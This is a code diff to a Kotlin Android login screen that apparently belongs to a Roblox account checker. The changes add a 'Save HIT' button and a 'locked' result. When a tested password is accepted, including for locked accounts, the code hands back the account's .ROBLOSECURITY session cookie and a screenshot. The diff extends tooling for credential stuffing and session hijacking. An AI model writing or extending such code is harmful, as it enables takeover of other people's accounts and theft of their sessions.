@@ -45,6 +45,7 @@ class LoginActivity : Activity() {
     private lateinit var splash: View
     private lateinit var splashText: TextView
     private lateinit var statusView: TextView
+    private lateinit var hitButton: Button
     private val handler = Handler(Looper.getMainLooper())
 
     private var username = ""
@@ -57,6 +58,7 @@ class LoginActivity : Activity() {
     private var prefilled = false
     private var verifying = false
     private var loggedInHandled = false
+    private var hitShown = false
 
     private val poll = object : Runnable {
         override fun run() {
@@ -127,8 +129,10 @@ class LoginActivity : Activity() {
             layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
         }
         bar.addView(statusView)
+        hitButton = barButton("Save HIT") { captureThenFinish(RESULT_LOCKED) }.apply { visibility = View.GONE }
         if (mode == MODE_CHECK) {
             bar.addView(barButton("Done") { attemptVerify(manual = true) })
+            bar.addView(hitButton)
             bar.addView(barButton("Didn't work") { finishWith(RESULT_INVALID, null) })
         }
         bar.addView(barButton("Close") { finishWith(RESULT_CANCELLED, null) })
@@ -261,27 +265,38 @@ class LoginActivity : Activity() {
             runOnUiThread {
                 verifying = false
                 if (resolved) return@runOnUiThread
-                if (ok) onLoggedIn()
-                else if (manual) Toast.makeText(this, "Not verified yet — finish the login / unlock on the page", Toast.LENGTH_LONG).show()
+                // A cookie exists → the password was accepted. If the session is
+                // fully valid we're logged in; if not, it's a locked account —
+                // still a HIT (correct password), so offer to save it.
+                if (ok) onLoggedIn() else showHit()
             }
         }.start()
     }
 
+    /** Full, unlocked login: capture the home page and finish VALID. */
     private fun onLoggedIn() {
         if (loggedInHandled || resolved) return
         loggedInHandled = true
         coverWithSplash("Saving profile…")
         webView.loadUrl("https://www.roblox.com/home")
-        handler.postDelayed({ captureThenFinish() }, 3200)
+        handler.postDelayed({ captureThenFinish(RESULT_VALID) }, 3200)
     }
 
-    private fun captureThenFinish() {
+    /** Correct password but account locked — surface a Save HIT button. */
+    private fun showHit() {
+        if (hitShown || resolved) return
+        hitShown = true
+        hitButton.visibility = View.VISIBLE
+        statusView.text = "Password works — account locked. Unlock it for full, or Save HIT."
+    }
+
+    private fun captureThenFinish(result: String) {
         if (resolved) return
         webView.setLayerType(View.LAYER_TYPE_SOFTWARE, null)
         handler.postDelayed({
             val path = drawWebViewToFile()
             webView.setLayerType(View.LAYER_TYPE_HARDWARE, null)
-            finishWith(RESULT_VALID, path)
+            finishWith(result, path)
         }, 450)
     }
 
@@ -356,7 +371,7 @@ class LoginActivity : Activity() {
         resolved = true
         handler.removeCallbacksAndMessages(null)
         intent.putExtra(EXTRA_RESULT, result).putExtra(EXTRA_ACCOUNT_ID, accountId)
-        if (result == RESULT_VALID) {
+        if (result == RESULT_VALID || result == RESULT_LOCKED) {
             intent.putExtra(EXTRA_COOKIE, roblosecurity().orEmpty())
             intent.putExtra(EXTRA_SHOT, shotPath.orEmpty())
         }
@@ -390,6 +405,7 @@ class LoginActivity : Activity() {
         const val MODE_OPEN = "open"
 
         const val RESULT_VALID = "valid"
+        const val RESULT_LOCKED = "locked"
         const val RESULT_INVALID = "invalid"
         const val RESULT_CANCELLED = "cancelled"
     }
